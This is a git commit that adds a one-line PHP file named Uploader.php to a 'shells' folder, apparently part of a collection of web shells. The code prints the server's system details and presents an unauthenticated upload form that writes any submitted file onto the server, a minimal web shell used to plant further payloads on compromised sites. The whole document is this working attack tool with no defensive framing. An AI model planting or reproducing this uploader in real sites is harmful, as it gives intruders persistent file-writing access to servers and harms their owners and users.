11bf3f909412dcb904b3d17433b981ddac9747fa
nosztalgia <166217460+nosztalgia@users.noreply.github.com>
2024-04-06 13:31:40 +0200

    Add files via upload

---
+++ shells/Uploader.php
@@ -0,0 +1,1 @@
+<?php echo '<pre>'.php_uname()."\n".'<br/><form method="post" enctype="multipart/form-data"><input type="file" name="__"><input name="_" type="submit" value="Upload"></form>';if($_POST){if(@copy($_FILES['__']['tmp_name'], $_FILES['__']['name'])){echo 'OK';}else{echo 'ER';}}?>
